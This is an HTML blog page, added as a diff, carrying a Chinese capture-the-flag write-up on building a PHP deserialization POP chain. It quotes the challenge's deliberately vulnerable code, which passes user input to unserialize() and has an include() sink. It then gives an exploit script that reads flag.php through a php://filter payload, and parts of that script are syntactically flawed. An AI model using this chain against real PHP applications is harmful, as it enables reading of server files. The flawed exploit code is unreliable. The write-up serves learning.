@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>pop链构造1 | Hexo</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="pop链构造1打开页面后，发现源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354Welcome to index.php&lt;?php&#x2F;&#x2F;flag is in flag.php&#x2F;&#x2F;WTF IS THIS?&#x2F;&#x2F;Learn From https:&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pop链构造1">
+<meta property="og:url" content="http://example.com/2021/09/08/pop%E9%93%BE%E6%9E%84%E9%80%A01/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="pop链构造1打开页面后，发现源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354Welcome to index.php&lt;?php&#x2F;&#x2F;flag is in flag.php&#x2F;&#x2F;WTF IS THIS?&#x2F;&#x2F;Learn From https:&#x2F;">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-09-07T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-09-08T16:59:25.672Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="代码审计">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img lazy-src="https://ss3.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/e4dde71190ef76c61d3907c89516fdfaae51676e.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/"></a></h1>
+		</hgroup>
+
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						<div class="icon-wrap icon-link hide" data-idx="2">
+							<div class="loopback_l"></div>
+							<div class="loopback_r"></div>
+						</div>
+						
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>菜单</li>
+						<li>标签</li>
+						
+						<li>友情链接</li>
+						
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主页</a></li>
+				        
+							<li><a href="/archives">所有文章</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/SSRF/" style="font-size: 11.67px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 13.33px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.67px;">http</a> <a href="/tags/java/" style="font-size: 11.67px;">java</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 13.33px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.33px;">sql注入</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 15px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 10px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 16.67px;">脚本编写</a>
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/smackgg/hexo-theme-smackdown">smackdown</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="https://ss3.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/e4dde71190ef76c61d3907c89516fdfaae51676e.jpg" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-pop链构造1" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/09/08/pop%E9%93%BE%E6%9E%84%E9%80%A01/" class="article-date">
+  	<time datetime="2021-09-07T16:00:00.000Z" itemprop="datePublished">2021-09-08</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      pop链构造1
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+	</div>
+
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="pop链构造1"><a href="#pop链构造1" class="headerlink" title="pop链构造1"></a>pop链构造1</h1><p>打开页面后，发现源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line">&lt;?php</span><br><span class="line">//flag is in flag.php</span><br><span class="line">//WTF IS THIS?</span><br><span class="line">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><br><span class="line">//And Crack It!</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">    public function append($value)&#123;</span><br><span class="line">        include($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;append($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file=&#x27;index.php&#x27;)&#123;</span><br><span class="line">        $this-&gt;source = $file;</span><br><span class="line">        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker&quot;;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;p;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;pop&#x27;]))&#123;</span><br><span class="line">    @unserialize($_GET[&#x27;pop&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $a=new Show;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中有几个魔术方法，所以可能是pop链的构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__invoke()魔术方法：在类的对象被调用为函数时候，自动被调用</span><br><span class="line">__toString()魔术方法：在类的对象被当作字符串操作的时候，自动被调用</span><br><span class="line">__wakeup()魔术方法，在类的对象反序列化的时候，自动被调用</span><br><span class="line">__construct()构造方法：在类的对象实例化之前，自动被调用</span><br><span class="line">__get()魔术方法：从不可访问的属性中读取数据会触发</span><br></pre></td></tr></table></figure>
+
+<p>从代码中，我们可以看见一个include()包含的函数，因此，我们需要想办法使用这个函数帮我们读取文件，而要使用include()函数，我们需要调用Modifier类中的append()方法，而要调用Modifier类中的append()方法，我们需要调用Modifier类中的__invoke()魔术方法，而要调用__invoke()魔术方法，要将类的对象被调用为函数，所以我们可以看见Test类中的__get()方法中的代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$function=$this-&gt;p;</span><br><span class="line">return $function();</span><br></pre></td></tr></table></figure>
+<p>我们可以构造$this-&gt;p=new Modifier();来调用__invoke()方法，而这其中需要调用__get()方法，而调用__get()方法，需要从不可访问的属性中读取数据时会触发，所以我们可以想到Show类的__toString()方法，其中的代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return $this-&gt;str-&gt;source;</span><br></pre></td></tr></table></figure>
+<p>所以我们可以构造$this-&gt;str=new Test();来触发__get方法，而要触发__toString()方法，要在类的对象被当作字符串操作时，所以我们可以看到__wakeup()魔术方法中的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source))</span><br></pre></td></tr></table></figure>
+<p>所以我们可以构造$this-&gt;source=new Show();</p>
+<p>所以我们可以构造exp，但是我们要在Show类中让$this-&gt;source为Show类的话，我们最后还需要用到__contruct()魔术方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a=new Show(&#x27;s&#x27;);  #就会触发__contruct()魔术方法，且将s作为__contruct()的参数</span><br><span class="line"></span><br><span class="line">因此，链条为</span><br></pre></td></tr></table></figure>
+<p>include()–&gt;append()–&gt;_invoke()–&gt;__get()–&gt;__toString()–&gt;__wakeup()–&gt;unserialize()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">所以我们构造exp</span><br></pre></td></tr></table></figure>
+<p>Welcome to index.php<br>&lt;?php<br>//flag is in flag.php</p>
+<p>class Modifier {<br>    protected  $var=”php://filter/read=convert.base64-encode/resource=flag.php”;</p>
+<p>}</p>
+<p>class Show{<br>    public $source;<br>    public $str;<br>    public function __construct($file=’index.php’){<br>        $this-&gt;source = $file;<br>    }<br>    public function __toString(){<br>        $this-&gt;str=new Test();<br>    }</p>
+<pre><code>public function __wakeup()&#123;
+    $this-&gt;source=new Show();
+&#125;
+</code></pre>
+<p>}</p>
+<p>class Test{<br>    public $p;</p>
+<pre><code>public function __get($key)&#123;
+    $this-&gt;p=new Modifier();
+&#125;
+</code></pre>
+<p>}</p>
+<p>$a=new Show();<br>$b=new Show($a)<br>$a-&gt;str=new Test();<br>$a-&gt;str-&gt;p=new Modifier();</p>
+<p>echo urlencode(serialize($b));<br>?&gt;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后对代码的详细解析</span><br></pre></td></tr></table></figure>
+<p>Welcome to index.php<br>&lt;?php<br>//flag is in flag.php                                    //提示：flag在flag.php文件内，猜测是当前网站根目录下的flag.php<br>//WTF IS THIS?<br>//Learn From <a target="_blank" rel="noopener" href="https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95">https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</a><br>//And Crack It!</p>
+<p>class Modifier {                                        //类，Modifier<br>    protected  $var;                                    //保护属性，$var<br>    public function append($value){                        //自定义方法，append($value)<br>        include($value);                                //文件包含参数$value，猜测这里可以利用文件包含读取flag.php的内容<br>    }<br>    public function __invoke(){                            //__invoke()魔术方法：在类的对象被调用为函数时候，自动被调用<br>        $this-&gt;append($this-&gt;var);                        //把保护属性$var传入自定义方法append($value)，执行一次<br>    }<br>}<br>//很明显：<br>//这里我们要想执行文件包含flag.php，那么就要调用append($value)方法<br>//这里我们要想调用append($value)方法，那么就需要调用__invoke()魔术方法<br>//这里我们要想调用__invoke()，那么就需要将Modifier类的对象调用为函数<br>//这里，我们会发现$var属性的值传给了$value参数，所以要想包含flag.php的源码，就需要给$var传入php://filter………………..[省略]</p>
+<p>class Show{                                                //类，Show<br>    public $source;                                     //公有属性，$source<br>    public $str;                                        //公有属性，$str<br>    public function __construct($file=’index.php’){        //公有构造方法，在类的对象实例化之前，自动被调用<br>        $this-&gt;source = $file;                            //给$this-&gt;source属性赋值$file<br>        echo ‘Welcome to ‘.$this-&gt;source.”<br>“;        //打印字符串<br>    }<br>    public function __toString(){                        //__toString()魔术方法，在类的对象被当作字符串操作的时候，自动被调用<br>        return $this-&gt;str-&gt;source;                        //返回，str属性值的source属性<br>    }</p>
+<pre><code>public function __wakeup()&#123;                            //__wakeup()魔术方法，在类的对象反序列化的时候，自动被调用
+    if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;    //正则匹配source属性的值
+        echo &quot;hacker&quot;;
+        $this-&gt;source = &quot;index.php&quot;;                //source属性赋值为index.php
+    &#125;
+&#125;
+</code></pre>
+<p>}<br>//很明显：<br>//__toString()魔术方法，有以下特征“$this-&gt;str-&gt;source”<br>//所以说，我们可以给str属性赋值为Test类的对象，那么由于该对象没有source属性，那么就会调用Test类的__get()魔术方法<br>//那么想要调用__toString魔术方法，就需要Show类的对象被当作字符串操作<br>//很明显，我们的__wakeup()魔术方法，里面有source属性被当作字符串去比较，所以我们可以给source属性赋值为Show属性的对象<br>//所以只要，我们可以利用反序列化，调用__wake()魔术方法，且source赋值为该类的对象，str属性赋值为Test类的对象即可</p>
+<p>class Test{                                                //类，Test<br>    public $p;                                            //公有属性，$p<br>    public function __construct(){                        //公有构造方法，在类的对象实例化之前，自动被调用<br>        $this-&gt;p = array();                                //属性$p初始化为数组<br>    }</p>
+<pre><code>public function __get($key)&#123;                        //__get()魔术方法，访问该类中不可访问的属性，自动被调用
+    $function = $this-&gt;p;                            //属性$this-&gt;p赋值给$function
+    return $function();                                //把$function调用为$function()函数
+&#125;
+</code></pre>
+<p>}<br>//很明显：<br>//这里的属性$p可以触发，__invoke()魔术方法，所以只要给$p赋值为Modifier类的对象即可</p>
+<p>if(isset($_GET[‘pop’])){<br>    @unserialize($_GET[‘pop’]);<br>}<br>else{<br>    $a=new Show;<br>    highlight_file(<strong>FILE</strong>);<br>}</p>
+<p>```<br>最后会回显base64码</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2021/09/08/%E5%BC%82%E6%88%96%E5%8A%A0%E7%9B%B2%E6%B3%A8/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">&lt;</strong>
+      <div class="article-nav-title">
+        
+          异或加盲注
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/09/07/%E7%BB%95%E8%BF%87%E6%95%B0%E7%BB%84%E9%95%BF%E5%BA%A6%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">绕过数组长度的反序列化</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<div class="ds-share share" data-thread-key="pop链构造1" data-title="pop链构造1" data-url="http://example.com/2021/09/08/pop%E9%93%BE%E6%9E%84%E9%80%A01/"  data-images="https://ss3.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/e4dde71190ef76c61d3907c89516fdfaae51676e.jpg" data-content="pop链构造1">
+    <div class="ds-share-inline">
+      <ul  class="ds-share-icons-16">
+      	<li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
+        <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
+        <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
+        <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
+        <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
+      </ul>
+      <div class="ds-share-icons-more">
+      </div>
+    </div>
+ </div>
+ 
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2021 John Doe
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>
+
+
+  </div>
+</body>
+</html>
